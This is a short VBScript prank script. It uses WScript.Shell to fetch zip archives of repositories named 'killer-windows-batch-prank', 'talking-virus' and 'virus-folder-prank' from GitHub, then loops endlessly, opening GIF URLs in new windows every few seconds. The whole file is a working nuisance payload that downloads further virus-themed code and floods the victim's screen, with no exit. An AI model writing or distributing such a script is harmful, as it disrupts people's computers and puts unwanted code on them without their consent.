Option Explicit

Dim objWshShell

Set objWshShell = WScript.CreateObject("WScript.Shell")
objWshShell.Run "https://codeload.github.com/zimus117/killer-windows-batch-prank/zip/master", 1, False
objWshShell.Run "https://codeload.github.com/zimus117/vbs-bugler/zip/master", 1, False
objWshShell.Run "https://codeload.github.com/zimus117/talking-virus/zip/master", 1, False
objWshShell.Run "https://codeload.github.com/zimus117/virus-folder-prank/zip/master", 1, False
do
objWshShell.Run "http://media.tumblr.com/60457d37db6fa740636ed9028a181c29/tumblr_inline_mrcsqdv6ll1qz4rgp.gif", 1, False
WScript.Sleep 3000
objWshShell.Run "https://i.gifer.com/7iKH.gif", 1, False
WScript.Sleep 3000
objWshShell.Run "https://media1.tenor.com/images/ee0943a8ce5c51d5776cb522445278f0/tenor.gif?itemid=4494683", 1, False
WScript.Sleep 10000
loop
Set objWshShell = Nothing

WScript.Quit 0
